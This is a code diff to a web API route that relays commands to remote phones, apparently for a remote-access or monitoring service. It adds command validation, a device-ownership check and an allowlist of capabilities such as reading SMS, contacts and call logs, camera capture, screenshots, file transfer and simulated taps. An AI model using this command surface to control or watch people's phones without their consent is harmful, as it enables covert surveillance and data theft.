@@ -32,6 +32,29 @@ export async function POST(
       throw ApiErrors.validationError("command is required and must be a string");
     }
 
+    // Validate command format (security: prevent command injection)
+    const commandLower = command.trim().toLowerCase();
+    if (!/^[a-z0-9-]+$/.test(commandLower) || commandLower.length > 50) {
+      throw ApiErrors.validationError("Invalid command format");
+    }
+
+    // Basic command whitelist validation
+    const allowedCommands = [
+      'getsms', 'sendsms', 'deletesms',
+      'getfiles', 'uploadfile', 'downloadfile', 'deletefile',
+      'getcalls', 'getcontacts', 'makecall',
+      'startcamera', 'stopcamera', 'capture',
+      'getscreen', 'screenshot',
+      'getinfo', 'getdeviceinfo',
+      'tap', 'swipe', 'scroll', 'type', 'back', 'home', 'menu',
+      'getapps', 'launchapp', 'closeapp',
+      'ping', 'status'
+    ];
+    
+    if (!allowedCommands.includes(commandLower)) {
+      throw ApiErrors.validationError(`Command '${commandLower}' is not allowed`);
+    }
+
     // Get user's license ID for device-server authentication
     const { data: profile, error: profileError } = await supabase
       .from("user_profiles")
@@ -45,18 +68,24 @@ export async function POST(
       );
     }
 
+    // CRITICAL: Always validate device ownership before allowing commands
     // RLS policy ensures user can only access their own devices
     // Verify device exists and belongs to user (RLS handles filtering)
     const { data: device, error: deviceError } = await supabase
       .from("devices")
-      .select("id")
+      .select("id, user_id")
       .eq("id", deviceId)
       .single();
 
-    // Note: You might want to allow commands even if device not in DB yet
-    // if (deviceError || !device) {
-    //   throw ApiErrors.notFound("Device");
-    // }
+    // Enforce device validation - no commands to unregistered devices
+    if (deviceError || !device) {
+      throw ApiErrors.notFound("Device not found");
+    }
+    
+    // Double-check device ownership (defense in depth)
+    if (device.user_id !== user.id) {
+      throw ApiErrors.forbidden("You do not have permission to access this device");
+    }
 
     // Send command to device-server.js with License ID for authentication
     let response;
@@ -67,7 +96,7 @@ export async function POST(
           "Content-Type": "application/json",
         },
         body: JSON.stringify({
-          command: command,
+          cmd: commandLower, // device-server expects 'cmd' not 'command'
           data: data || {},
           licenseId: profile.license_id, // License ID is used as AUTH_SECRET
         }),
